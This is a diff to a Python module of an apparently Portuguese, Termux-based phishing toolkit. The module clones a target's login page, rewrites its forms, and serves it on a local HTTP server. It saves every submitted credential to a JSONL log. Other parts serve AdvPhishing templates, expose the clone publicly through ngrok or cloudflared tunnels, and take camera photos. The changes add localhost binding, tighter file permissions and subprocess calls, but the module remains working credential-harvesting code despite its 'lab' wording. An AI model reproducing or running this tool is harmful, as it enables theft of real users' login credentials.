@@ -17,7 +17,7 @@ ROOT = utils.ROOT
 PAGES = os.path.join(ROOT, "modules", "phishing", "pages")
 ADVP = os.path.join(ROOT, "modules", "phishing", "AdvPhishing")
 
-_handler_state = {"redirect": "/"}  # onde enviada a vítima após captura
+_handler_state = {"redirect": "/", "dir": "."}  # onde enviada a vítima após captura
 
 
 class _Handler(SimpleHTTPRequestHandler):
@@ -36,8 +36,13 @@ class _Handler(SimpleHTTPRequestHandler):
             "post": corpo,
         }
         try:
-            with open(os.path.join(utils.caminho("logs"), "phishing_captures.jsonl"), "a", encoding="utf-8") as f:
+            destino = os.path.join(utils.caminho("logs"), "phishing_captures.jsonl")
+            with open(destino, "a", encoding="utf-8") as f:
                 f.write(json.dumps(evento, ensure_ascii=False) + "\n")
+            try:
+                os.chmod(destino, 0o600)  # capturas sao sensiveis
+            except Exception:
+                pass
         except Exception:
             pass
         print(utils.c("\n  [CAPTURA] {}".format(corpo), utils.VERDE))
@@ -53,25 +58,48 @@ class _Handler(SimpleHTTPRequestHandler):
         pass
 
 
-def _servir(diretorio, porta, redirect="/"):
-    """Sobe o servidor HTTP em thread e bloqueia até Enter (parar)."""
+def _servir(diretorio, porta, redirect="/", host=None):
+    """Sobe o servidor HTTP em thread e bloqueia até Enter (parar).
+
+    Padrao: 127.0.0.1 (somente a maquina local). Para vitima do lab em
+    outra maquina use --host 0.0.0.0 (ou o modulo tunnel).
+    """
     _handler_state["dir"] = diretorio
     _handler_state["redirect"] = redirect
+    host = host or "127.0.0.1"
     try:
-        srv = HTTPServer(("", porta), _Handler)
+        srv = HTTPServer((host, porta), _Handler)
     except OSError as e:
-        print(utils.c("  Nao foi possivel abrir a porta {}: {}".format(porta, e), utils.VERMELHO))
+        print(utils.c("  Nao foi possivel abrir {}:{}: {}".format(host, porta, e), utils.VERMELHO))
         return
     threading.Thread(target=srv.serve_forever, daemon=True).start()
-    print(utils.c("  Servidor rodando em http://127.0.0.1:{}".format(porta), utils.VERDE))
-    print("  Capturas sao salvas em logs/phishing_captures.jsonl")
+    print(utils.c("  Servidor rodando em http://{}:{}".format(host, porta), utils.VERDE))
+    if host in ("127.0.0.1", "localhost"):
+        print("  Somente esta maquina enxerga o servidor.")
+        print(utils.c("  Para vitima do lab: --host 0.0.0.0  (ou use o modulo tunnel).", utils.AMARELO))
+    print("  Capturas sao salvas em logs/phishing_captures.jsonl (arquivo sensivel)")
     print(utils.c("  Use um tunel (modulo tunnel) para expor ao alvo do lab.", utils.AMARELO))
     try:
         input("  Enter para parar o servidor...")
     except EOFError:
         pass
     srv.shutdown()
-    utils.log("phishing_server", "127.0.0.1", "servidor encerrado")
+    utils.log("phishing_server", host, "servidor encerrado")
+
+
+def _parametros_phish(ctx, cfg):
+    """(porta, host) vindos da CLI (--port/--host ou posicional numerico)."""
+    pos, flags = utils.parse_extras(ctx.get("extras"))
+    porta = cfg.get("phishing_port", 8080)
+    if "port" in flags:
+        try:
+            porta = int(flags["port"])
+        except ValueError:
+            pass
+    elif pos and pos[0].isdigit():
+        porta = int(pos[0])
+    host = flags.get("host") or cfg.get("phishing_host", "127.0.0.1")
+    return porta, host
 
 
 def _reescrever_formularios(html):
@@ -83,9 +111,9 @@ def _reescrever_formularios(html):
 def clone_page(alvo, ctx):
     """Clona uma página de login para servidor local e captura POSTs."""
     cfg = ctx["config"]
-    porta = int(ctx["extras"][0]) if ctx["extras"] and ctx["extras"][0].isdigit() else cfg.get("phishing_port", 8080)
+    porta, host = _parametros_phish(ctx, cfg)
     if utils.is_dry(ctx):
-        utils.mostrar_dry("clone_page", "clonar {} e servir em :{}".format(alvo, porta))
+        utils.mostrar_dry("clone_page", "clonar {} e servir em http://{}:{}".format(alvo, host, porta))
         return
     print("  Baixando {}...".format(alvo))
     try:
@@ -102,7 +130,7 @@ def clone_page(alvo, ctx):
         f.write(html)
     print(utils.c("  Clone salvo em {}".format(pasta), utils.VERDE))
     utils.log("clone_page", alvo, "clone salvo: {}".format(pasta))
-    _servir(pasta, porta)
+    _servir(pasta, porta, host=host)
 
 
 def _advphishing_clone():
@@ -113,16 +141,23 @@ def _advphishing_clone():
     print(utils.c("  AdvPhishing nao encontrado localmente.", utils.AMARELO))
     if not utils.confirmar("  Clonar https://github.com/Ignitetch/AdvPhishing agora?", "s"):
         return False
-    status = os.system('git clone --depth 1 https://github.com/Ignitetch/AdvPhishing.git "{}"'.format(destino))
+    import subprocess
+    try:
+        status = subprocess.run(
+            ["git", "clone", "--depth", "1",
+             "https://github.com/Ignitetch/AdvPhishing.git", destino]).returncode
+    except Exception as erro:
+        print(utils.c("  git indisponivel: {}".format(erro), utils.VERMELHO))
+        return False
     return status == 0
 
 
 def templates(alvo, ctx):
     """Serve templates do AdvPhishing com servidor Python (adaptado ao Termux)."""
     cfg = ctx["config"]
-    porta = int(ctx["extras"][0]) if ctx["extras"] and ctx["extras"][0].isdigit() else cfg.get("phishing_port", 8080)
+    porta, host = _parametros_phish(ctx, cfg)
     if utils.is_dry(ctx):
-        utils.mostrar_dry("templates", "listar/serve templates AdvPhishing em :{}".format(porta))
+        utils.mostrar_dry("templates", "listar/serve templates AdvPhishing em http://{}:{}".format(host, porta))
         return
     if not _advphishing_clone():
         print(utils.c("  Clone cancelado/falhou.", utils.VERMELHO))
@@ -172,13 +207,13 @@ def templates(alvo, ctx):
                 pass
     print(utils.c("  Template copiado (sem PHP — captura feita pelo servidor Python).", utils.VERDE))
     utils.log("phishing_templates", origem_dir, "servido em {}".format(pasta))
-    _servir(pasta, porta)
+    _servir(pasta, porta, host=host)
 
 
 def tunnel(alvo, ctx):
     """Túnel público (ngrok ou cloudflared) para o clone local."""
     cfg = ctx["config"]
-    porta = int(ctx["extras"][0]) if ctx["extras"] and ctx["extras"][0].isdigit() else cfg.get("phishing_port", 8080)
+    porta, _host = _parametros_phish(ctx, cfg)
     if utils.is_dry(ctx):
         utils.mostrar_dry("tunnel", "expor localhost:{} via ngrok/cloudflared".format(porta))
         return
@@ -242,6 +277,9 @@ def qr(alvo, ctx):
 
 def camera_sim(ctx_alvo, ctx):
     """Captura de câmera — SIMULAÇÃO com consentimento duplo (Termux:API)."""
+    if utils.is_dry(ctx):
+        utils.mostrar_dry("camera_sim", "termux-camera-photo")
+        return
     print(utils.c("  Este modulo requer CONSENTIMENTO EXPLICITO da pessoa filmada.", utils.AMARELO))
     print("  Sem Termux:API instalada, apenas simulamos o fluxo.")
     if not utils.confirmar("  A pessoa filmada consentiu com a captura?", "n"):
@@ -250,12 +288,14 @@ def camera_sim(ctx_alvo, ctx):
     if not utils.confirmar("  Confirmar captura (2a confirmacao)?", "n"):
         print(utils.c("  Cancelado.", utils.VERMELHO))
         return
-    if utils.is_dry(ctx):
-        utils.mostrar_dry("camera_sim", "termux-camera-photo")
-        return
     if utils.ferramenta_existe("termux-camera-photo"):
+        import subprocess
         destino = os.path.join(utils.caminho("logs"), "camera_foto.jpg")
-        status = os.system("termux-camera-photo {}".format(destino))
+        try:
+            status = subprocess.run(["termux-camera-photo", destino]).returncode
+        except Exception as erro:
+            print(utils.c("  Erro: {}".format(erro), utils.VERMELHO))
+            status = 1
         if status == 0:
             print(utils.c("  Foto salva em {}".format(destino), utils.VERDE))
         utils.log("camera_sim", "local", "termux-camera-photo status={}".format(status))
